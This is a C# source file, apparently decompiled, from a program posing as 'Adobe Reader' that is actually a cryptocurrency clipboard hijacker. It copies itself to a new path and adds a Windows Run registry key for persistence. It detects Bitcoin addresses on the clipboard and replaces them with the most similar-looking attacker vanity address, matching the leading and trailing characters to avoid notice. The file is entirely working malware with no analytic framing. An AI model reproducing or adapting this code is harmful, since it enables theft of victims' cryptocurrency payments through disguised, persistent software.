using Adobe_Reader.Properties;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace Adobe_Reader
{
	internal static class Tools
	{
		internal static bool ExeSmartCopy(string targetExePath, bool overwrite = false, bool setStartup = false, bool exitStartDelete = false)
		{
			if (Application.ExecutablePath == targetExePath)
			{
				return false;
			}
			Directory.CreateDirectory(Directory.GetParent(targetExePath).ToString());
			File.Copy(Application.ExecutablePath, targetExePath, overwrite);
			if (setStartup)
			{
				SetStartup(targetExePath);
			}
			if (exitStartDelete)
			{
				string arguments = Application.ExecutablePath.Replace(" ", "?");
				Process.Start(targetExePath, arguments);
				Environment.Exit(0);
			}
			return true;
		}

		private static void SetStartup(string exePath)
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
			registryKey?.SetValue(Path.GetFileName(exePath), exePath);
		}

		internal static bool ProbablyBtcAddress(string clipboard)
		{
			string text = clipboard.Trim();
			if (text.Length >= 26 && text.Length <= 34)
			{
				if (!new Regex("^(1|3)[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz].*$").IsMatch(text))
				{
					return false;
				}
				return true;
			}
			return false;
		}

		internal static void SetMostSimilarBtcAddress(string originalClipboardText)
		{
			try
			{
				string b = originalClipboardText.Trim();
				HashSet<string> hashSet = new HashSet<string>();
				int num = 0;
				foreach (string item in Resources.vanityAddresses.Split(new string[1]
				{
					Environment.NewLine
				}, StringSplitOptions.RemoveEmptyEntries).ToList())
				{
					int num2 = FirstCharFitNum(item, b);
					if (num2 >= num)
					{
						if (num2 == num)
						{
							hashSet.Add(item);
						}
						else if (num2 > num)
						{
							hashSet.Clear();
							num = num2;
							hashSet.Add(item);
							Clipboard.SetText(item);
						}
					}
				}
				int num3 = 0;
				foreach (string item2 in hashSet)
				{
					int num4 = LastCharFitNum(item2, b);
					if (num4 > num3)
					{
						num3 = num4;
						Clipboard.SetText(item2);
					}
				}
			}
			catch
			{
			}
		}

		private static int LastCharFitNum(string a, string b)
		{
			int num = 0;
			bool flag = true;
			for (int i = 0; i < Math.Min(a.Length, b.Length) & flag; i++)
			{
				if (a[a.Length - 1 - i] != b[b.Length - 1 - i])
				{
					flag = false;
				}
				else
				{
					num++;
				}
			}
			return num;
		}

		private static int FirstCharFitNum(string a, string b)
		{
			int num = 0;
			bool flag = true;
			for (int i = 0; i < Math.Min(a.Length, b.Length) & flag; i++)
			{
				if (a[i] != b[i])
				{
					flag = false;
				}
				else
				{
					num++;
				}
			}
			return num;
		}
	}
}
